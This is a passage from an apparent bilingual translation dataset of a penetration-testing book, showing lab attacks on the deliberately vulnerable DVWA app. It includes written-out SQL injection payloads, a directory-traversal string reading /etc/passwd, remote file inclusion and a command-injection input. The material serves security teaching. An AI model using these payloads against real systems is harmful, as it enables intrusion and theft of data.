- en: 'Let''s navigate on the page that XSS stored in the left menu. We are presented
    with two input fields: Name and Message. This simulates a basic Comments or Feedback
    form found on many websites. In the Name field, enter whatever name you would
    like, but in the Message field enter the following code and click Sign Guestbook:'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们导航到左侧菜单中存储XSS的页面。我们看到两个输入字段：名称和消息。这模拟了许多网站上找到的基本评论或反馈表单。在名称字段中，输入任何您喜欢的名称，但在消息字段中输入以下代码，然后单击“签名留言簿”：
- en: '[PRE10]'
  id: totrans-190
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: '![](img/bf3fa090-98cd-494c-ad9c-b1f933ea6971.jpg)'
  id: totrans-191
  prefs: []
  type: TYPE_IMG
  zh: '![](img/bf3fa090-98cd-494c-ad9c-b1f933ea6971.jpg)'
- en: 'Here''s the popup we get:'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 这是我们得到的弹出窗口：
- en: '![](img/aa79f930-1705-4457-9a63-ba75275b73f1.jpg)'
  id: totrans-193
  prefs: []
  type: TYPE_IMG
  zh: '![](img/aa79f930-1705-4457-9a63-ba75275b73f1.jpg)'
- en: Now, if we navigate away from this page, say to the Home page, then return to
    the XSS stored page, our code should run again and present a popup with the cookie
    for the current session. This can be expanded upon greatly, and with a bit more
    knowledge of JavaScript, an attacker can do a lot of damage.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，如果我们离开这个页面，比如到主页，然后返回到XSS存储页面，我们的代码应该再次运行并显示一个带有当前会话cookie的弹出窗口。这可以大大扩展，并且通过更多JavaScript的了解，攻击者可以造成很大的破坏。
- en: SQL injection
  id: totrans-195
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: SQL注入
- en: SQL injection, or SQLi, is an attack on an SQL database where a code or database
    query is inserted via some form of input from a client to the application. SQLi
    is one of the oldest vulnerabilities, but still one of the most common and, since
    SQL-based databases are so common, one of the most dangerous.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: SQL注入，或SQLi，是对SQL数据库的攻击，其中通过来自客户端到应用程序的某种输入插入了代码或数据库查询。SQLi是最古老的漏洞之一，但仍然是最常见的漏洞之一，因为基于SQL的数据库是如此普遍，所以也是最危险的漏洞之一。
- en: The severity of SQL injection attacks is limited by the attacker's skill and
    imagination, and to a lesser extent, defense in depth countermeasures, such as
    low-privilege connections to the database server. In general, consider SQL injection
    a high-impact severity.
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: SQL注入攻击的严重程度受到攻击者的技能和想象力的限制，以及防御深度对策的影响，例如对数据库服务器的低特权连接。一般来说，将SQL注入视为高影响严重性。
- en: Before we can inject SQL, we should have a basic understanding of SQL and also
    understand database structures.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们注入SQL之前，我们应该对SQL有一个基本的了解，并且了解数据库结构。
- en: 'SQL is considered a fourth-generation programming language because it uses
    standard human-understandable words for its syntax: just English and brackets.
    SQL is used for databases and we can use it to create tables; add records, delete,
    and update, set permissions to users; and so on.'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: SQL被认为是第四代编程语言，因为它使用标准的人类可理解的单词作为其语法：只是英语和括号。 SQL用于数据库，我们可以使用它来创建表；添加记录，删除和更新，为用户设置权限；等等。
- en: 'Here''s a basic query to create a table:'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个创建表的基本查询：
- en: '[PRE11]'
  id: totrans-201
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: The preceding code says create a table named `employee` with the following columns,
    `first`, `last`, `age`, `address`, and `city`, then state and assign their data
    types with `varchar(15)` character limits [Variable Character, with a max of 15
    characters], and number(3) [Numbers only, max 3 numbers therefore 999].
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 前面的代码表示创建一个名为`employee`的表，具有以下列，`first`，`last`，`age`，`address`和`city`，然后分配它们的数据类型为`varchar(15)`字符限制[可变字符，最多15个字符]，和number(3)
    [仅数字，最多3个数字，因此为999]。
- en: 'Here is a basic query (also known as a `select` statement) to retrieve data
    from a table:'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个基本查询（也称为`select`语句）来从表中检索数据：
- en: '[PRE12]'
  id: totrans-204
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: The `select` statement is the query we'll be exploiting.
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: '`select`语句是我们将利用的查询。'
- en: When you log in to a website, it sends a select query/statement to the database
    to retrieve the data to confirm the data you logged in with.
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 当您登录网站时，它会向数据库发送一个选择查询/语句，以检索数据以确认您登录的数据。
- en: 'Let''s say the login page looks like this:'
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 假设登录页面如下所示：
- en: '![](img/0ea426a2-6048-413d-a465-163d3eec76ac.jpg)'
  id: totrans-208
  prefs: []
  type: TYPE_IMG
  zh: '![](img/0ea426a2-6048-413d-a465-163d3eec76ac.jpg)'
- en: 'The query on the backend when logging in may look like this:'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 在登录时的后端查询可能如下所示：
- en: '[PRE13]'
  id: totrans-210
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: The preceding statement says select all (`*`) from the table named users where
    the column `username=`  is the variable username (Login field) and the column
    `password =` is the variable password (Password field).
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 前面的语句表示从名为users的表中选择所有（`*`），其中列`username=`是变量用户名（登录字段），列`password =`是变量密码（密码字段）。
- en: Manual SQL injection
  id: totrans-212
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 手动SQL注入
- en: 'Now that we understand the basics of SQL queries, let''s use this to our advantage.
    Working with DVWA for this again, log in to DVWA and go to SQL Injection:'
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们了解了SQL查询的基础知识，让我们利用这一点。再次使用DVWA，登录到DVWA并转到SQL注入：
- en: '![](img/14c10021-743c-416a-bf0b-4300034cf931.jpg)'
  id: totrans-214
  prefs: []
  type: TYPE_IMG
  zh: '![](img/14c10021-743c-416a-bf0b-4300034cf931.jpg)'
- en: We can see that this page has a field for the user to enter the User ID of someone.
    If we enter `1` here, the application should tell us which user has User ID 1.
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到这个页面有一个字段，供用户输入某人的用户ID。如果我们在这里输入`1`，应用程序应该告诉我们谁有用户ID 1。
- en: 'Let''s do a simple test for SQL Injection. In the User ID field, instead of
    entering a number, enter the following:'
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们对SQL注入进行一个简单的测试。在用户ID字段中，不要输入数字，输入以下内容：
- en: '`%’ or ‘1’=’1`:'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: '`%’ or ‘1’=’1`：'
- en: '![](img/b219451f-4172-4fee-adcf-67a087ce569a.jpg)'
  id: totrans-218
  prefs: []
  type: TYPE_IMG
  zh: '![](img/b219451f-4172-4fee-adcf-67a087ce569a.jpg)'
- en: 'Let''s assume that the initial query looks like this:'
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们假设初始查询如下所示：
- en: '[PRE14]'
  id: totrans-220
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'We assume the table is named `users_table`, with the relative column names.
    What we''ve done is changed the preceding statement to look like this:'
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 我们假设表名为`users_table`，具有相关的列名。我们所做的是将前面的语句更改为以下内容：
- en: '[PRE15]'
  id: totrans-222
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'Then click Submit. Our result should be all the data in the table, as shown:'
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 然后点击提交。我们的结果应该是表中的所有数据，如下所示：
- en: '![](img/207d7906-063a-4a70-a8b1-b9d6337e13f8.jpg)'
  id: totrans-224
  prefs: []
  type: TYPE_IMG
  zh: '![](img/207d7906-063a-4a70-a8b1-b9d6337e13f8.jpg)'
- en: The `%` means mod and will return `false`. But we added the OR operator. So
    since the first part of the query will return `false` (because of the `%`), the
    OR will force it to execute the second part, `'1'='1`, which is `true`. Thus,
    because everything the query runs, it's always `true` for every record in the
    table, SQL prints out all the records of the table.
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: '`%`表示mod并将返回`false`。但我们添加了OR运算符。因此，由于查询的第一部分将返回`false`（因为`%`），OR将强制其执行第二部分，`''1''=''1`，这是`true`。因此，因为查询运行的一切，对于表中的每条记录来说，它总是`true`，SQL打印出表中的所有记录。'
- en: 'Here are a few other queries you can try:'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是您可以尝试的其他查询：
- en: 'Get the username of the account being used to connect between the web application
    and the database: `%'' or 0=0 union select null, user() #`'
  id: totrans-227
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '获取用于在Web应用程序和数据库之间连接的帐户的用户名：`%'' or 0=0 union select null, user() #`'
- en: 'Get the current database that we''ve been pulling data from: `%'' or 0=0 union
    select null, database() #`'
  id: totrans-228
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '从中获取我们一直在提取数据的当前数据库：`%'' or 0=0 union select null, database() #`'
- en: 'Display the information schema table: The `information_schema` table is a database
    that stores information about all of the other databases; `%'' and 1=0 union select
    null, table_name from information_schema.tables #`'
  id: totrans-229
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '显示信息模式表：`information_schema`表是一个存储有关所有其他数据库的信息的数据库；`%'' and 1=0 union select
    null, table_name from information_schema.tables #`'
- en: 'Display database tables: Using data from the previous query, we can find out
    what the table is: `%'' and 1=0 union select null, table_name from information_schema.tables
    where table_name like ''user%''#`'
  id: totrans-230
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 显示数据库表：使用上一个查询的数据，我们可以找出表是什么：`%' and 1=0 union select null, table_name from
    information_schema.tables where table_name like 'user%'#`
- en: Automated SQL injection
  id: totrans-231
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 自动化SQL注入
- en: Now that we understand what SQL injection looks like, let's take a look at some
    tools that can automate this process.
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们了解了SQL注入的外观，让我们看一些可以自动化此过程的工具。
- en: sqlmap
  id: totrans-233
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: sqlmap
- en: sqlmap is a tool built into Kali that can be used to identify and exploit SQLi
    vulnerabilities. For this example, we're going to use Burp Suite to gather some
    data that we'll need to give to `sqlmap` to work.
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: sqlmap是Kali内置的工具，可用于识别和利用SQLi漏洞。在这个例子中，我们将使用Burp Suite收集一些数据，然后将其提供给`sqlmap`进行工作。
- en: Launch Burp Suite and proceed to set up the browser to route all traffic through
    its proxy. Ensure that intercept is on. Go to the SQL Injection page on the DVWA
    application and enter a user ID; in this case, I'll enter `1`.
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 启动Burp Suite并设置浏览器通过其代理路由所有流量。确保拦截是打开的。转到DVWA应用程序上的SQL注入页面并输入用户ID；在这种情况下，我将输入`1`。
- en: 'Burp will catch the request. Forward it on until the request completes. You
    should see your result on the web page. Go to the Target tab, select the DVWA
    IP (`192.168.0.19` in my case) and use the arrow heads to drill down through the
    results following the URL path, `http://192.168.0.19/dvwa/vulnerabilities/sqli/`
    (you can confirm this in the browser''s address bar):'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: Burp会捕获请求。将其转发直到请求完成。您应该在网页上看到您的结果。转到目标选项卡，选择DVWA IP（在我的情况下是`192.168.0.19`），并使用箭头向下浏览结果，按照URL路径，`http://192.168.0.19/dvwa/vulnerabilities/sqli/`（您可以在浏览器的地址栏中确认）：
- en: '![](img/0ec95d23-9cdb-47f4-8baa-e4461a05bc4f.jpg)'
  id: totrans-237
  prefs: []
  type: TYPE_IMG
  zh: '![](img/0ec95d23-9cdb-47f4-8baa-e4461a05bc4f.jpg)'
- en: 'Select the request with the `200` status (HTML code `200`):'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 选择状态为`200`（HTML代码为`200`）的请求：
- en: '![](img/762ccbec-2e12-4090-ab03-6e4ac68f9677.jpg)'
  id: totrans-239
  prefs: []
  type: TYPE_IMG
  zh: '![](img/762ccbec-2e12-4090-ab03-6e4ac68f9677.jpg)'
- en: 'In the Request tab, we get the information we need—the actual request that''s
    being sent by the web application (Referrer) which is in the first line: `/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit`
    and we get the PHP session ID or Cookie:'
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: 在请求选项卡中，我们得到了我们需要的信息-Web应用程序发送的实际请求（引用者），它在第一行中：`/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit`，以及我们得到的PHP会话ID或Cookie：
- en: '![](img/924facf8-48fe-429e-bb1e-7b6d6412c9d4.jpg)'
  id: totrans-241
  prefs: []
  type: TYPE_IMG
  zh: '![](img/924facf8-48fe-429e-bb1e-7b6d6412c9d4.jpg)'
- en: 'With this data, let''s open a Terminal and enter the following to get the Database
    User, as we did with the manual steps:'
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 有了这些数据，让我们打开终端并输入以下内容来获取数据库用户，就像我们用手动步骤一样：
- en: '[PRE16]'
  id: totrans-243
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: 'This is one line with no breaks at `--cookie`:'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一行没有断点的`--cookie`：
- en: '![](img/4e54b488-4dda-4eee-b4de-1fda3b1bfddc.jpg)'
  id: totrans-245
  prefs: []
  type: TYPE_IMG
  zh: '![](img/4e54b488-4dda-4eee-b4de-1fda3b1bfddc.jpg)'
- en: '`-u`: For the target URL we got from Burp'
  id: totrans-246
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-u`：用于从Burp获取的目标URL'
- en: '`--cookie`: For the cookie information we captured with Burp'
  id: totrans-247
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`--cookie`：用于从Burp捕获的cookie信息'
- en: '`-b`: To display the database banner'
  id: totrans-248
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-b`：显示数据库横幅'
- en: '`--current-db`: To get the current database'
  id: totrans-249
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`--current-db`：获取当前数据库'
- en: '`--current-user`: To get the current user of the current database:'
  id: totrans-250
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`--current-user`：获取当前数据库的当前用户：'
- en: '![](img/3e6e8774-b7cb-4834-90c3-9e9a9d215982.jpg)'
  id: totrans-251
  prefs: []
  type: TYPE_IMG
  zh: '![](img/3e6e8774-b7cb-4834-90c3-9e9a9d215982.jpg)'
- en: 'You will be prompted during the test, and you can safely press *Enter* to accept
    the defaults. There is only one prompt where I did not use that default, purely
    for the sake of time:'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 在测试过程中会提示您，您可以安全地按下*Enter*键接受默认设置。只有一个提示，我没有使用默认设置，纯粹是为了节省时间：
- en: '![](img/86a8851c-f0ba-4c31-91fc-2e219323a931.jpg)'
  id: totrans-253
  prefs: []
  type: TYPE_IMG
  zh: '![](img/86a8851c-f0ba-4c31-91fc-2e219323a931.jpg)'
- en: 'At the end, we are presented with the results:'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们得到了结果：
- en: '![](img/888d2a28-948f-4e74-9f54-d295f46cb8b6.jpg)'
  id: totrans-255
  prefs: []
  type: TYPE_IMG
  zh: '![](img/888d2a28-948f-4e74-9f54-d295f46cb8b6.jpg)'
- en: We get information on the operating system (`Ubuntu 10.04`) that's running the
    database, the server-side technology (`PHP 5.3.2 and Apache 2.2.14`), the database
    (`MySQL`), the current database (`dvwa`), and the current user (`dvwa`).
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: 我们得到了有关运行数据库的操作系统（`Ubuntu 10.04`），服务器端技术（`PHP 5.3.2和Apache 2.2.14`），数据库（`MySQL`），当前数据库（`dvwa`）和当前用户（`dvwa`）的信息。
- en: To get a listing of all the options available to you for `sqlmap`, simply type
    `sqlmap -h` in the Terminal and if you want more advanced options, enter `sqlmap
    --hh`.
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 要获取`sqlmap`提供给您的所有选项的列表，只需在终端中键入`sqlmap -h`，如果您想要更高级的选项，输入`sqlmap --hh`。
- en: Command-execution, directory-traversal, and file-inclusion
  id: totrans-258
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 命令执行，目录遍历和文件包含
- en: Command-injection is a type of attack where the main goal is to have system
    commands be executed by the host operating system of a vulnerable application.
    These types of attacks are possible when unsafe user input is passed from the
    application to a system shell. The commands that are supplied are executed at
    the privilege level of the application, for example, a web server may be run with
    a `www-data` user or Apache user as opposed to the root user.
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 命令注入是一种攻击类型，其主要目标是使系统命令由易受攻击的应用程序的主机操作系统执行。当不安全的用户输入从应用程序传递到系统shell时，这些类型的攻击是可能的。提供的命令以应用程序的特权级别执行，例如，Web服务器可能以`www-data`用户或Apache用户而不是root用户运行。
- en: Directory-traversal is when a server allow an attacker to read a file or directories
    outside of the normal web server directory.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 目录遍历是指服务器允许攻击者读取正常Web服务器目录之外的文件或目录。
- en: File-inclusion vulnerabilities are vulnerabilities that allows an attacker to
    include a file to a web server by exploiting vulnerable inclusion procedures.
    This type of vulnerability occurs, for instance, when a page receives as input
    the path to the file that has to be included and this input is not properly sanitized,
    allowing for an attacked to inject directory-traversal characters (`../`).
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 文件包含漏洞是一种允许攻击者通过利用易受攻击的包含过程将文件包含到Web服务器的漏洞。例如，当页面接收文件路径作为输入并且此输入未经适当清理时，就会发生这种类型的漏洞，从而允许攻击者注入目录遍历字符（`../`）。
- en: File-inclusion, directory-traversal, and command-injection are all attack vectors
    that work in tandem.
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 文件包含，目录遍历和命令注入都是一起工作的攻击向量。
- en: Directory-traversal and file-inclusion
  id: totrans-263
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 目录遍历和文件包含
- en: Let's begin by testing to see whether we can get the web application to jump
    up one directory.
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们开始测试，看看我们是否可以让Web应用程序跳转到上一级目录。
- en: 'We''ll be in the DVWA app again. Log in and navigate to the File Inclusion
    page from the menu on the left:'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将再次进入DVWA应用程序。登录并从左侧菜单导航到文件包含页面：
- en: '![](img/960d200a-726a-4737-9e48-a4058627a381.jpg)'
  id: totrans-266
  prefs: []
  type: TYPE_IMG
  zh: '![](img/960d200a-726a-4737-9e48-a4058627a381.jpg)'
- en: 'In the address bar in the browser, you should see `<IP Address>/dvwa/vulnerabilities/fi/?page=include.php`.
    Let''s change `include.php` to `index.php` and see what happens:'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 在浏览器的地址栏中，您应该看到`<IP地址>/dvwa/vulnerabilities/fi/?page=include.php`。让我们将`include.php`更改为`index.php`，看看会发生什么：
- en: '![](img/7d396c69-c85c-4608-9ea5-fe698301e84f.jpg)'
  id: totrans-268
  prefs: []
  type: TYPE_IMG
  zh: '![](img/7d396c69-c85c-4608-9ea5-fe698301e84f.jpg)'
- en: '![](img/63e95547-5f9f-461f-baa3-a64416f63e6c.jpg)'
  id: totrans-269
  prefs: []
  type: TYPE_IMG
  zh: '![](img/63e95547-5f9f-461f-baa3-a64416f63e6c.jpg)'
- en: Nothing happens, suggesting that there is no `index.php` in this directory.
    We know that `index.php` exists, however it's in the `/dvwa` directory. How do
    we know this? When we used Burp Suite to crack the credentials to the `login.php`
    page, we saw that a successful login redirected the user to `index.php`. You will
    not see `index.php` in the browser, as `index.php` is the default root page for
    PHP (`default.asp` for ASP) and so, by default does not display it. To test, you
    simply click on the Home button in the menu of DVWA and after `/dvwa`, enter `/index.php`.
    This will take you to the same home page.
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 什么都没有发生，这表明在这个目录中没有`index.php`。但是我们知道`index.php`是存在的，它在`/dvwa`目录中。我们是怎么知道的呢？当我们使用Burp
    Suite来破解`login.php`页面的凭据时，我们看到成功登录会将用户重定向到`index.php`。您在浏览器中看不到`index.php`，因为`index.php`是PHP的默认根页面（ASP的`default.asp`），因此默认情况下不会显示它。要测试，您只需在DVWA菜单中点击主页按钮，然后在`/dvwa`之后输入`/index.php`。这将带您到同样的主页。
- en: 'Navigate to the File-Inclusion page again. Looking at the URL, we see that
    we''re currently in `/dvwa/vulnerability/fi/`, which is two directories down from
    our root directory of `dvwa`. In the address of the browser, remove `include.php`,
    this time replacing it with `../../index.php`. Press *Enter* and let''s see what
    happens:'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 再次导航到文件包含页面。查看URL，我们看到我们目前在`/dvwa/vulnerability/fi/`，这是从我们的根目录`dvwa`向下两个目录。在浏览器的地址中，删除`include.php`，这次用`../../index.php`替换它。按下*Enter*，让我们看看会发生什么：
- en: '![](img/a7c902c8-f055-45ec-9b6c-6a88fc7d9c99.jpg)'
  id: totrans-272
  prefs: []
  type: TYPE_IMG
  zh: '![](img/a7c902c8-f055-45ec-9b6c-6a88fc7d9c99.jpg)'
- en: Sure enough, it takes us to the Home page. Great. We've successfully traversed
    the directory structure of the web server and, since we used a file local to the
    system, we now know that **Local-File Inclusion** (**LFI**) is possible.
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 果然，它把我们带到了主页。太好了。我们成功地遍历了Web服务器的目录结构，并且，由于我们使用了系统中的一个文件，我们现在知道**本地文件包含**（**LFI**）是可能的。
- en: From our previous results with `sqlmap` and `nikto`, we know the operating system
    that this `apache` server is running on is Linux (Ubuntu). By default, in Linux,
    `apache` stores its files in the `/var/www/html/` directory. Linux stores essential
    user information in the `/etc/passwd` file and hashed user passwords in the `/etc/shadow`
    file. With this knowledge, let's try changing directories to see the `/etc/passwd`
    file.
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 根据我们之前使用`sqlmap`和`nikto`的结果，我们知道这个`apache`服务器正在运行的操作系统是Linux（Ubuntu）。在Linux中，默认情况下，`apache`将其文件存储在`/var/www/html/`目录中。Linux将基本用户信息存储在`/etc/passwd`文件中，并将散列用户密码存储在`/etc/shadow`文件中。有了这个知识，让我们尝试改变目录以查看`/etc/passwd`文件。
- en: On the File Inclusion page again, remove `include.php` and enter `../../../../../../etc/passwd`.
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 再次在文件包含页面上，删除`include.php`，输入`../../../../../../etc/passwd`。
- en: '`../../../../../../` takes us through `/var/www/html/dvwa/vulnerability/fi/`
    up to  `/`:'
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: '`../../../../../../`将我们带到了`/var/www/html/dvwa/vulnerability/fi/`，然后到了`/`：'
- en: '![](img/d6487a78-666a-4aee-9284-022051392e82.jpg)'
  id: totrans-277
  prefs: []
  type: TYPE_IMG
  zh: '![](img/d6487a78-666a-4aee-9284-022051392e82.jpg)'
- en: '![](img/022de721-b309-411c-a6ae-b65448ed2bc0.jpg)'
  id: totrans-278
  prefs: []
  type: TYPE_IMG
  zh: '![](img/022de721-b309-411c-a6ae-b65448ed2bc0.jpg)'
- en: We successfully changed directories up six then down one to `/etc`, gaining
    access to the `passwd` file. What we see is the contents of the `passwd` file.
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 我们成功地向上改变了六个目录，然后向下改变了一个目录到`/etc`，获得了对`passwd`文件的访问。我们看到的是`passwd`文件的内容。
- en: 'Here''s a screenshot of it copied into a text file and cleaned up:'
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 这是它复制到文本文件并清理后的截图：
- en: '![](img/051c5396-7aab-44f8-96b2-0c3acdd40cea.jpg)'
  id: totrans-281
  prefs: []
  type: TYPE_IMG
  zh: '![](img/051c5396-7aab-44f8-96b2-0c3acdd40cea.jpg)'
- en: The `x` after the first `:` symbol means that this account has a password and
    it is stored hashed in the `/etc/shadow` file.
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: 冒号后的`x`表示这个帐户有密码，并且它以散列形式存储在`/etc/shadow`文件中。
- en: Knowing that we can traverse the directories and that LFI is possible, let's
    now attempt a **Remote File-Inclusion** (**RFI**) attack.
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 知道我们可以遍历目录并且LFI是可能的，现在让我们尝试一下**远程文件包含**（**RFI**）攻击。
- en: 'Our next step is to pass a file from a remote server (our Kali system) to our
    target system. In a Terminal, enter the following:'
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的下一步是将一个文件从远程服务器（我们的Kali系统）传递到我们的目标系统。在终端中，输入以下内容：
- en: '[PRE17]'
  id: totrans-285
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: This starts the `apache` web server on our system. You can test it by going
    to the browser, entering your system IP, and you will be presented with the default
    `apache` HTML page.
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 这启动了我们系统上的`apache` Web服务器。您可以通过转到浏览器，输入您的系统IP，然后会看到默认的`apache` HTML页面来测试它。
- en: 'Back on the DVWA application, navigate to the File Inclusion page. In the address
    bar, replace `include.php` with the path to your `webserver/index.html`:'
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: 回到DVWA应用程序，在文件包含页面导航。在地址栏中，用您的`webserver/index.html`的路径替换`include.php`：
- en: '![](img/58b45f1e-0414-4116-b741-1659f157f4b1.jpg)'
  id: totrans-288
  prefs: []
  type: TYPE_IMG
  zh: '![](img/58b45f1e-0414-4116-b741-1659f157f4b1.jpg)'
- en: 'It successfully opens `index.html`, which is hosted on our web server. RFI
    is possible on this system:'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: 它成功地打开了`index.html`，这是托管在我们的Web服务器上的。在这个系统上可能发生RFI：
- en: '![](img/e0204f7d-5e25-4a31-a112-8d41eed6f097.jpg)'
  id: totrans-290
  prefs: []
  type: TYPE_IMG
  zh: '![](img/e0204f7d-5e25-4a31-a112-8d41eed6f097.jpg)'
- en: Command execution
  id: totrans-291
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 命令执行
- en: Command-injection vulnerabilities allow an attacker to inject commands into
    poorly-validated user input. This input is used in used in some form by the system
    shell and in the process, the command injected gets executed on the system.
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 命令注入漏洞允许攻击者将命令注入到验证不足的用户输入中。这个输入以某种形式被系统shell使用，在这个过程中，注入的命令在系统上被执行。
- en: One case where you may find this is an application that takes user input, for
    example a username or email address, and creates a folder on the system that's
    used to house that user's data, file uploads, and so on.
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: 有一种情况是，您可能会发现这是一个应用程序，它接受用户输入，例如用户名或电子邮件地址，并在系统上创建一个用于存储用户数据、文件上传等的文件夹。
- en: 'In our target system, DVWA, there is a page that is used to demonstrate this
    flaw by exploiting user input that is passed to the system ping command. Let''s
    log in to DVWA again on the OWASP Broken Apps VM and select command injection
    from the menu on the left:'
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的目标系统DVWA中，有一个页面用于演示这个缺陷，通过利用传递给系统ping命令的用户输入。让我们再次登录到OWASP Broken Apps VM上的DVWA，并从左侧菜单中选择命令注入：
- en: '![](img/b3b29310-7227-4a21-9efb-c8409a910a60.jpg)'
  id: totrans-295
  prefs: []
  type: TYPE_IMG
  zh: '![](img/b3b29310-7227-4a21-9efb-c8409a910a60.jpg)'
- en: 'As stated before, this input is passed to the ping command, which should be
    an IP Address. We can confirm this by passing `127.0.0.1`:'
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，这个输入被传递给ping命令，应该是一个IP地址。我们可以通过传递`127.0.0.1`来确认这一点：
- en: '![](img/67be9982-8445-40b7-8f7e-83d998f88049.jpg)'
  id: totrans-297
  prefs: []
  type: TYPE_IMG
  zh: '![](img/67be9982-8445-40b7-8f7e-83d998f88049.jpg)'
- en: We get the expected result. Now, let's try to pass another command into this
    input. We know that this application is being hosted on Linux. To join commands
    in Linux, we can use `&&` between the commands.
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: 我们得到了预期的结果。现在，让我们尝试将另一个命令传递到这个输入中。我们知道这个应用程序正在Linux上托管。在Linux中，我们可以使用`&&`来连接命令。
- en: 'With `&&`, the previous command must complete successfully before the following
    command gets executed. `;` will execute the command whether or not the previous
    completed successfully. Let''s try it with a basic `ls` command. In the input
    box, enter `127.0.0.1; ls` and then click Submit:'
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: 使用`&&`，前一个命令必须成功完成，然后才能执行下一个命令。`;`将执行命令，无论前一个是否成功完成。让我们尝试一个基本的`ls`命令。在输入框中，输入`127.0.0.1;
    ls`，然后点击提交：
- en: '![](img/92f93794-3eab-4af8-a70c-49476382b33b.jpg)'
  id: totrans-300
  prefs: []
